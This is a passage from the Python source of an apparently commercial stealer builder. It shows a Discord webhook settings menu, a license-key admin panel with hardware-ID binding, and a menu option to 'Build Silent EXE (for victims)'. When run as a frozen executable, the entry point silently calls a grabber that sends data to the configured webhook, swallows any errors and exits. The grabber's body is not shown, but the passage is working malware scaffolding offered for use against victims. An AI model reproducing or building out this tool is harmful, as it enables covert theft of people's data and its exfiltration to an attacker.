# ──────────────────────────────────────────────────────────────

def settings_menu():
    print("\n" + "=" * 50)
    print("⚙️  SETTINGS")
    print("=" * 50)
    
    settings = load_settings()
    current_webhook = settings.get("webhook_url", "")
    
    print(f"\n📬 Current Webhook: {current_webhook if current_webhook else 'NOT SET'}")
    print(f"🎨 Current Theme: {settings.get('theme', 'neon').upper()}")
    
    print("\n" + "─" * 40)
    print("  1. Set Webhook URL")
    print("  2. Clear Webhook URL")
    print("  3. Test Webhook")
    print("  4. Back to main menu")
    
    choice = input("\nSelect option: ").strip()
    
    if choice == "1":
        print("\n" + "─" * 30)
        webhook = input("Enter Discord webhook URL: ").strip()
        if webhook.startswith("https://discord.com/api/webhooks/"):
            settings["webhook_url"] = webhook
            save_settings(settings)
            log_success("Webhook saved successfully!")
        else:
            log_error("Invalid webhook URL format.")
        input("\nPress Enter to continue...")
        return True
    
    elif choice == "2":
        if "webhook_url" in settings:
            del settings["webhook_url"]
            save_settings(settings)
            log_success("Webhook cleared!")
        else:
            log_warn("No webhook to clear.")
        input("\nPress Enter to continue...")
        return True
    
    elif choice == "3":
        test_webhook()
        input("\nPress Enter to continue...")
        return True
    
    elif choice == "4":
        return False
    
    return True

# ──────────────────────────────────────────────────────────────
#  ADMIN PANEL
# ──────────────────────────────────────────────────────────────

def admin_panel():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           🔐 LICENSE KEY ADMIN PANEL                ║
    ║        "only YOU can generate keys, babe"          ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    manager = LicenseManager()
    
    while True:
        print("\n" + "─" * 50)
        print("📋 OPTIONS:")
        print("  1. Generate new license key")
        print("  2. List all keys")
        print("  3. Revoke a key")
        print("  4. Extend a key")
        print("  5. View HWID info")
        print("  6. Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            print("\n" + "─" * 30)
            expiry = input("Expiry time (in minutes): ").strip()
            try:
                expiry_minutes = int(expiry)
                if expiry_minutes <= 0:
                    print("❌ Expiry must be positive")
                    continue
            except:
                print("❌ Invalid expiry time")
                continue
            
            max_uses = input("Max uses (1 for single-use, 0 for unlimited): ").strip()
            try:
                max_uses = int(max_uses)
            except:
                print("❌ Invalid max uses")
                continue
            
            key = manager.generate_key(expiry_minutes, max_uses)
            
            print("\n" + "=" * 50)
            print("✅ LICENSE KEY GENERATED!")
            print("=" * 50)
            print(f"\n🔑 Key: {key}")
            print(f"⏰ Expires in: {expiry_minutes} minutes")
            print(f"📊 Max uses: {'Unlimited' if max_uses == 0 else max_uses}")
            print("\n📋 Copy this key and give it to the user!")
            print("=" * 50)
            
        elif choice == "2":
            print("\n📋 ALL LICENSES:")
            print("─" * 50)
            licenses = manager.list_keys()
            if not licenses:
                print("No licenses found.")
            else:
                for key, data in licenses.items():
                    status = "✅ Active" if data.get("active", True) else "❌ Revoked"
                    bound = f"Bound to: {data['hwid'][:16]}..." if data["hwid"] else "🔓 Unbound"
                    expiry = data["expires_at"][:16].replace("T", " ")
                    uses = f"{data.get('uses', 0)}/{data.get('max_uses', 1) if data.get('max_uses', 1) > 0 else '∞'}"
                    print(f"\n🔑 {key}")
                    print(f"   Status: {status}")
                    print(f"   Expires: {expiry}")
                    print(f"   {bound}")
                    print(f"   Uses: {uses}")
            
        elif choice == "3":
            key = input("Enter license key to revoke: ").strip().upper()
            if manager.revoke_key(key):
                print(f"✅ Key {key} revoked successfully")
            else:
                print("❌ Key not found")
            
        elif choice == "4":
            key = input("Enter license key to extend: ").strip().upper()
            minutes = input("Add how many minutes? ").strip()
            try:
                minutes = int(minutes)
                if manager.extend_key(key, minutes):
                    print(f"✅ Key {key} extended by {minutes} minutes")
                else:
                    print("❌ Key not found")
            except:
                print("❌ Invalid minutes")
            
        elif choice == "5":
            hwid = get_hwid()
            print("\n" + "=" * 50)
            print("🖥️ HWID INFO")
            print("=" * 50)
            print(f"\nHWID: {hwid}")
            
        elif choice == "6":
            print("Goodbye! 👋")
            break
        else:
            print("❌ Invalid option")

# ──────────────────────────────────────────────────────────────
#  USER MAIN MENU
# ──────────────────────────────────────────────────────────────

def user_main_menu():
    while True:
        print("\n" + "=" * 50)
        print("📋 MAIN MENU")
        print("=" * 50)
        print("  1. Settings (Webhook & Test)")
        print("  2. Themes")
        print("  3. Build Silent EXE (for victims)")
        print("  4. Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            settings_menu()
        elif choice == "2":
            themes_menu()
        elif choice == "3":
            build_silent_exe()
            print("\nPress Enter to continue...")
            input()
        elif choice == "4":
            print("Goodbye! 👋")
            break
        else:
            print("❌ Invalid option")
            print("\nPress Enter to continue...")
            input()

# ──────────────────────────────────────────────────────────────
#  ENTRY POINT
# ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--admin":
        admin_panel()
    else:
        if getattr(sys, 'frozen', False):
            try:
                webhook = get_webhook_from_settings()
                if webhook:
                    run_silent_grabber(webhook)
            except:
                pass
            sys.exit(0)
        else:
            print_header()
            
            if not authenticate_user():
                print("\nPress Enter to exit...")
                input()
                sys.exit(1)
            
            user_main_menu()